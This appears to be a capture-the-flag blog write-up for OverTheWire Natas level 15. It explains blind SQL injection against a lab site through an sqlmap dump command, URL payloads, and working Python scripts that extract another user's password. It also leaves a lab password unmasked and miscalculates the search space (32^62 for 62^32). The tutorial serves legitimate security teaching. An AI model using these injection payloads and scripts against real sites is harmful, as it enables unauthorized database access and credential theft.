@@ -1,0 +1,336 @@
+---
+layout: post
+title:  "Natas Level 14 → Level 15"
+date:   2021-05-27 17:53:10
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: Blind leading the blind
+mathjax: true
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+The natas15 site allows us to check for the existence of a user. It also provides a link the the source code.  Let's take a look at that.
+
+```php
+<?
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '<censored>');
+    mysql_select_db('natas15', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?> 
+```
+
+Here we have an SQL query that takes unsanitized inputs, like the previous level. Unlike the last level, the output of the database is not rendered to the webpage. We simply get generic messages as to whether or not the user exists. This tells us that we'll need to perform a Blind SQL attack on the site. 
+
+A Blind SQL attack is used when the output of the database is not rendered to the webpage. The attack asks many true/false questions of the database and determines the to these questions based on the response from the database.
+
+Looking at the code, we can see the two responses to any queries made: if query returns a result it outputs, "This user exists." to the page, otherwise it outputs, "This user doesn't exist." to the page.
+
+Here I'll show two ways to get the next password. One uses [sqlmap](https://sqlmap.org/), a popular tool to perform the attack for you, the other is a Python script that shows what is really going on behind the scene in sqlmap. Both are valid ways to solve this problem. 
+
+You'll need the supply the credentials to the current level for either solution. You may also wish to adjust the thread count.
+
+### sqlmap
+The sqlmap tool is capable of a wide range of attacks and can be used to determine a lot of the information that is supplied below. Since we're in the unique position of having the code to the site, we can fill in a lot of this information without having to resort to teasing the information out of the site.
+
+```
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php" --auth-type=Basic --auth-cred=natas15:A------------------------------J --string="This user exists" --data="username=natas16" --level=3 --risk=1 --technique=B --threads=4 --dbms=MySQL -D natas15 -T users -C username,password --dump --batch
+```
+
+Here's a breakdown on each option:
+```
+-u              URL
+--auth-type     HTTP authentication
+--auth-cred     HTTP authentication credentials (name:password)
+--string        The site reponse to a TRUE condition
+--data          Data string to be sent
+--level         Number of checks to be performed. 
+                Range is 1 to 5. Default is 1.
+--risk          Types of payloads to use. Higher numbers could cause problems for the server. 
+                Range is 1 to 3.  Default is 1.
+--technique     B is for Blind
+--threads       Max number of concurrent HTTP(s) requests
+--dbms          DataBase Management System 
+-D              Database name        
+-T              Table name
+-C              Column name(s)
+--dump          Dump DBMS database table entries
+--batch         Never ask for user input, use the default behaviour
+```
+
+The sqlmap tool will run for a couple minutes and will return with the username and password for all users on the server, including natas16. Use the natas16 password to access the next level.
+
+### Python 3 scripting
+
+In a real-world situation I'd use sqlmap. However, this is not a real-world situation. It's a learning environment. As such, priority should be given to learning and not "winning." That said, this section will not attempt to teach Python programming.
+
+Before creating the script, we'll need to get a few ideas under our belt first. Log into the site if you haven't already and append the following to the URL:
+
+```
+?username=natas16%22+and+password=+%22a&debug
+```
+
+By passing the debug option we can see the query that was passed, along with the 
+
+```
+Executing query: SELECT * from users where username="natas16" and password= "a"
+This user doesn't exist.
+```
+
+This tells us that the password for the user natas16 is not "a." This should not come as much of a surprise. A better question would be to ask if the password contains at least one "a." To do this we'll need to use the LIKE operator. The wildcard character is the percent symbol. Let's modify the previous query.
+
+```
+?username=natas16%22+and+password+LIKE+%22%a%&debug
+```
+
+Here's the output:
+```
+Executing query: SELECT * from users where username="natas16" and password LIKE "%a%"
+This user exists.
+```
+
+This is certainly more helpful! Here we can see the password contains an "a." Let's see if it also contains an "A."
+
+```
+?username=natas16%22+and+password+LIKE+%22%A%&debug
+```
+
+Here's the output:
+```
+Executing query: SELECT * from users where username="natas16" and password LIKE "%A%"
+This user exists.
+```
+
+While the output tells us that password contains an "A", I can tell you with certainty that is does not. The reason we're being told that there's an "A" is because the query is case insensitive. To make the query case sensitive, we need to add BINARY to the query. Let's modify our last search.
+
+```
+?username=natas16%22+and+password+LIKE+BINARY+%22%A%&debug
+```
+
+Now we see the "A" is not part of the password
+```
+Executing query: SELECT * from users where username="natas16" and password LIKE BINARY "%A%"
+This user doesn't exist.
+```
+
+Now that we can search for characters within the password, we can significantly speed up our search by only searching for characters known to be in the password. This will be the first part of both scripts.
+
+If you look back on all the password for the Natas levels you'll notice that they're comprised of both upper- and lower-case characters, and digits for a combined character count of 62. There's also 32 characters to each password. This makes the worst-case search space $32^{62} \approx 2.09 \times 10^{93}$. If we filter out the unused characters, we can shrink the the worst-case search space to $32^{25} \approx 4.25 \times 10^{37}$. While not small, its a significant improvement.
+
+After we have the filtered characters, we'll need to discover the password using them.
+
+In order to discover this we need to try each character until we get a positive response from the server. What makes this different from the last queries is the placement of the wildcard. Instead of checking if there's an "A" anywhere, we'll ask if there's a match for "A" followed by any other character.
+
+Let's search to see if the first character in the natas16 password is an "a."
+```
+?username=natas16%22+and+password+LIKE+BINARY+%22a%&debug
+```
+
+Now we see the "A" is not part of the password
+```
+Executing query: SELECT * from users where username="natas16" and password LIKE BINARY "a%"
+This user doesn't exist.
+```
+
+While before we were able to confirm that the password contains an "a", its not the first character.
+
+Let's modify the search once again, this time with the first character of the password, a "W."
+```
+?username=natas16%22+and+password+LIKE+BINARY+%22W%&debug
+```
+
+Here we see that the password starts with a "W." We can now stop searching for the first character and move on to the second character. Let's see if the second character is an "a."
+
+```
+Executing query: SELECT * from users where username="natas16" and password LIKE BINARY "W%"
+This user exists.
+```
+
+Let's search to see if the second character in the natas16 password is an "a."
+```
+?username=natas16%22+and+password+LIKE+BINARY+%22Wa%&debug
+```
+
+Here we see the second character is an "a."
+```
+Executing query: SELECT * from users where username="natas16" and password LIKE BINARY "Wa%"
+This user exists
+```
+
+You'd have to repeat this process 30 more times over all upper- and lower-case characters, and digits. This is a task best left to a script, especially given the length of the password.
+
+Below are two scripts, one is single-threaded, the other multithreaded. The single threaded script is easier to both read and write, but is slower as it waits for a response to each query before asking another.
+
+The multithreaded script allows the computer to make multiple queries at the same time without having to wait for a response. While the results may be returned out of order, they will be displayed in order.
+
+If you decide to run either script, you'll need to edit the natas15_password variable to include the correct password for the current level. Do not edit natas16_password variable!
+
+
+#### Single-threaded 
+Script Performance
+```
+Filtering characters completed in 16.1 seconds
+Password search completed in 108.97 seconds
+
+Completed in 125.07 seconds
+```
+
+Here's the code:
+```python
+#!/usr/bin/env python
+import time
+import string
+import requests
+from requests.auth import HTTPBasicAuth
+
+start_script = time.perf_counter()
+all_chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
+natas15_password = "A------------------------------J"  # Password for the current level
+natas16_password = ""  # Buffer for the next level password
+filtered_chars = ""
+
+
+def filter_characters(char):
+    data = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}
+    req = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',
+                        auth=HTTPBasicAuth('natas15', natas15_password), data=data)
+
+    if 'exists' in req.text:
+        return char
+    else:
+        return None
+
+
+start_filter = time.perf_counter()
+for ac in all_chars:
+    retval = filter_characters(ac)
+    if retval is not None:
+        print(retval, end='', flush=True)
+        filtered_chars = filtered_chars + ac
+
+end_filter = time.perf_counter()
+print(f'\nFiltering characters completed in {round(end_filter - start_filter, 2)} seconds')
+
+start_password = time.perf_counter()
+for i in range(0, 32):
+    for fc in filtered_chars:
+        data = {'username': 'natas16" and password LIKE BINARY "' + natas16_password + fc + '%" #'}
+        req = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',
+                            auth=HTTPBasicAuth('natas15', natas15_password), data=data)
+        if 'exists' in req.text:
+            natas16_password = natas16_password + fc
+            print(fc, end='', flush=True)
+            break
+end_password = time.perf_counter()
+print(f'\nPassword search completed in {round(end_password - start_password, 2)} seconds')
+
+end_script = time.perf_counter()
+print(f'\nCompleted in {round(end_script - start_script, 2)} seconds')
+```
+
+#### Multithreaded 
+Script Performance
+```
+Filtering characters completed in 2.38 seconds
+Password search completed in 34.44 seconds
+
+Completed in 36.81 seconds
+```
+
+Here's the code:
+```python
+#!/usr/bin/env python
+import time
+import string
+import requests
+from requests.auth import HTTPBasicAuth
+import concurrent.futures
+
+start_script = time.perf_counter()
+all_chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
+natas15_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"  # Password for the current level
+natas16_password = ""  # Buffer for the next level password
+filtered_chars = ""
+
+
+def get_chars(char):
+    data = {'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'}
+    req = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',
+                        auth=HTTPBasicAuth('natas15', natas15_password), data=data)
+
+    if 'exists' in req.text:
+        return char
+    else:
+        return None
+
+
+start_filter = time.perf_counter()
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    result = executor.map(get_chars, all_chars)
+
+    for r in result:
+        if r is not None:
+            print(r, end='', flush=True)
+            filtered_chars = filtered_chars + str(r)
+
+end_filter = time.perf_counter()
+print(f'\nFiltering characters completed in {round(end_filter - start_filter, 2)} seconds')
+
+
+def get_password(fc):
+    data = {'username': 'natas16" and password LIKE BINARY "' + natas16_password + str(fc) + '%" #'}
+    req = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug',
+                        auth=HTTPBasicAuth('natas15', natas15_password), data=data)
+
+    if 'exists' in req.text:
+        return str(fc)
+    else:
+        return None
+
+
+start_password = time.perf_counter()
+for _ in range(0, 32):
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        result = executor.map(get_password, filtered_chars)
+
+        for r in result:
+            if r is not None:
+                natas16_password = natas16_password + str(r)
+                print(r, end='', flush=True)
+
+end_password = time.perf_counter()
+print(f'\nPassword search completed in {round(end_password - start_password, 2)} seconds')
+
+end_script = time.perf_counter()
+print(f'\nCompleted in {round(end_script - start_script, 2)} seconds')
+```
